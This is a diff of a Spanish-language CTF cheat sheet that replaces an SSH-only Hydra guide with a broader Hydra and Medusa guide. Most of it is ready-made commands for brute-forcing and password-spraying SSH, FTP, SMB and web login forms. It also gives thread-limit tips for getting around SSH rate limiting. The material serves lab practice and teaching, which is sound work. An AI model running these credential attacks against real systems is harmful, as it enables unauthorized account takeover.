@@ -1,49 +1,72 @@
-# Fuerza Bruta Online (Servicios de Red / SSH)
-
-**Objetivo:** Obtener acceso a un servicio activo (como SSH en el puerto 22) probando credenciales directamente contra el servidor.
-**Herramienta Reina en CTFs:** `Hydra`
+# Fuerza Bruta Online (Servicios y Web)
 
 ---
 
-## La Regla de Oro de Hydra (Mayúsculas vs Minúsculas)
-El éxito con Hydra depende de no confundir estas banderas:
-* `-l` (minúscula) = **L**ogin específico (Ej: `-l root`)
-* `-L` (mayúscula) = **L**ista de Logins (Ej: `-L usuarios.txt`)
-* `-p` (minúscula) = **P**assword específico (Ej: `-p admin123`)
-* `-P` (mayúscula) = **P**assword Lista (Ej: `-P /usr/share/wordlists/rockyou.txt`)
+## Herramienta Principal: Hydra (El Estándar)
+
+**Objetivo:** Obtener acceso a un servicio activo (SSH, FTP, SMB) o panel web probando credenciales directamente contra el servidor. Es rápida, versátil y la herramienta reina en CTFs.
+**Sintaxis Básica (Servicios):** `hydra [Banderas_Credenciales] [IP_Víctima] [Protocolo]`
+**Sintaxis Básica (Web):** `hydra [Banderas_Credenciales] [IP_Víctima] http-post-form "[Ruta]:[Parámetros]:[Mensaje_Error]"`
+
+### Banderas Clave de Hydra
+El éxito con Hydra depende estrictamente de no confundir mayúsculas y minúsculas:
+*   `-l` (minúscula): **L**ogin específico (Ej: `-l admin`).
+*   `-L` (mayúscula): **L**ista de Logins (Ej: `-L usuarios.txt`).
+*   `-p` (minúscula): **P**assword específico (Ej: `-p admin123`).
+*   `-P` (mayúscula): **P**assword Lista (Ej: `-P /usr/share/wordlists/rockyou.txt`).
+*   `-s`: Puerto personalizado (Si el servicio SSH está en el 2222, usas `-s 2222`).
+
+### Comandos Tácticos (CTF)
+
+**1. Ataque SSH (Usuario conocido, lista de contraseñas):**
+`hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X`
+
+**2. Ataque FTP (Password Spraying - Lista de usuarios, 1 contraseña conocida):**
+`hydra -L users.txt -p "SuperSecret123" ftp://10.10.10.X`
+
+**3. Ataque Web (Formularios POST):**
+*(Requiere la ruta, los campos inyectando `^USER^` y `^PASS^`, y el mensaje de fallo exacto).*
+`hydra -l admin -P rockyou.txt 10.10.10.X http-post-form "/login.php:user=^USER^&pass=^PASS^:Fallo el inicio de sesion"`
+
+### Optimización para CTFs (Prevención de Errores)
+Si atacas muy rápido, los servicios de red modernos (especialmente SSH) se protegerán y rechazarán tus conexiones, arrojando falsos negativos.
+*   `-t 4`: Tareas Paralelas (Hilos). Para SSH, **nunca uses más de 4 hilos**.
+*   `-V`: Verbose. Muestra cada intento en tiempo real en la pantalla.
+*   `-f`: Exit on First. ¡Vital! Se detiene automáticamente en cuanto encuentra una credencial válida, ahorrando tiempo y ruido.
+
+**El Comando Perfecto (Ejemplo SSH seguro y rápido):**
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4 -V -f`
 
 ---
 
-## Escenarios de Ataque (Ejemplos con SSH - Puerto 22)
+## Alternativa: Medusa (El Plan B)
 
-### Escenario 1: Tengo el USUARIO, me falta la CONTRASEÑA
-*Es el caso más común. Encontraste un nombre (ej. "admin" o el nombre del creador de la máquina) y quieres adivinar su clave.*
-* **Comando:**
-  `hydra -l [usuario] -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4`
-* **Ejemplo práctico:**
-  `hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.20 -t 4`
+**Objetivo:** Herramienta de fuerza bruta paralela. Es la alternativa directa cuando Hydra falla, da falsos positivos o causa errores de "Connection Refused".
+**Sintaxis Principal:** `medusa -h [IP] -u [Usuario] -P [Diccionario] -M [Protocolo]`
 
-### Escenario 2: Tengo la CONTRASEÑA, me falta el USUARIO (Password Spraying)
-*Encontraste una contraseña en el código fuente de la web (ej. "P@ssw0rd2026!"), pero no sabes a qué usuario pertenece. Creas un archivo `users.txt` con posibles nombres y atacas.*
-* **Comando:**
-  `hydra -L users.txt -p "[contraseña]" ssh://10.10.10.X -t 4`
-* **Ejemplo práctico:**
-  `hydra -L users.txt -p "SuperSecret123" ssh://10.10.10.20 -t 4`
+### Banderas Clave de Medusa
+A diferencia de Hydra, Medusa requiere que el objetivo y el módulo se definan con banderas.
+*   `-h`: IP del objetivo (Host).
+*   `-u` / `-U`: Usuario único (`-u admin`) / Lista de usuarios (`-U users.txt`).
+*   `-p` / `-P`: Clave única (`-p admin123`) / Lista de claves (`-P rockyou.txt`).
+*   `-M`: Módulo a utilizar (ej. `ssh`, `ftp`, `smb`, `mysql`).
+*   `-n`: Puerto personalizado (Si el SSH no está en el 22, usas `-n 2222`).
 
-### Escenario 3: No tengo NADA (Lista contra Lista)
-*Solo se recomienda si los diccionarios son muy pequeños (ej. 10 usuarios y 50 contraseñas). Si usas Rockyou aquí, puede tardar semanas.*
-* **Comando:**
-  `hydra -L users.txt -P passwords.txt ssh://10.10.10.X -t 4`
+### Comandos Tácticos (CTF)
 
----
+**1. Ataque SSH (Usuario conocido, lista de contraseñas):**
+`medusa -h 10.10.10.X -u admin -P /usr/share/wordlists/rockyou.txt -M ssh`
 
-## Optimización y Prevención de Errores
+**2. Ataque FTP (Lista de usuarios, lista de contraseñas):**
+`medusa -h 10.10.10.X -U usuarios.txt -P passwords.txt -M ftp`
 
-Si atacas muy rápido, el servicio SSH de la máquina víctima se asustará, rechazará las conexiones y Hydra fallará arrojando errores.
+**3. Ataque SMB (Carpetas compartidas de Windows):**
+`medusa -h 10.10.10.X -u Administrator -P rockyou.txt -M smbnt`
 
-* **`-t 4` (Tareas Paralelas):** Controla la velocidad. Para SSH, **nunca uses más de 4 hilos**. Si usas más, SSH bloqueará las conexiones y perderás contraseñas válidas.
-* **`-V` (Verbose):** Te muestra en pantalla cada intento en tiempo real (útil para saber que la herramienta no se ha quedado pegada).
-* **`-f` (Exit on First):** ¡Muy recomendado! Le dice a Hydra: "En cuanto encuentres una contraseña válida, detente". Evita que siga escaneando innecesariamente.
+### Optimización para CTFs
+*   `-O [archivo.txt]` -> Guarda los resultados exitosos en un archivo (ideal para no perder la contraseña si limpias la terminal).
+*   `-b` -> Suprime el banner gigante del inicio (hace que arranque un poco más rápido y limpia la pantalla).
+*   `-t` -> Cantidad de hilos concurrentes (por defecto es estable, pero puedes limitarlo con `-t 4` si el servidor es muy inestable).
 
-**El Comando Perfecto y Definitivo:**
-`hydra -l admin -P rockyou.txt ssh://10.10.10.X -t 4 -V -f`
+**El Comando Perfecto (Ejemplo SSH rápido y limpio):**
+`medusa -h 10.10.10.X -u john -P rockyou.txt -M ssh -b -O credenciales_exito.txt`
